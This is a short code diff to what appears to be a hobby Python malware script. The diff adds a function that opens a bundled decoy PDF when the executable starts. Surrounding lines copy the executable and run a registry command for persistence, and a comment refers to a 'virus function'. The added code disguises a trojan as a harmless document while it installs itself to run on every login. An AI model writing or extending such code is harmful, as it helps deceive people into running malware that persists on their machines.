@@ -18,6 +18,13 @@ def add_to_registery():
         shutil.copyfile(sys.executable, new_path)
         sp.call(regedit_command, shell=True)
 
+def open_fake_file(): 
+    # when exe runs, opens a file (ex.: pdf)
+    fake_file = sys._MEIPASS + "\\random_pdf.pdf"
+    sp.Popen(fake_file, shell=True)
+
+
+open_fake_file() # open decoy pdf at start
 add_to_registery() # starting presistence
 
 # virus function part (printing haked you 100 times in 50 secs)
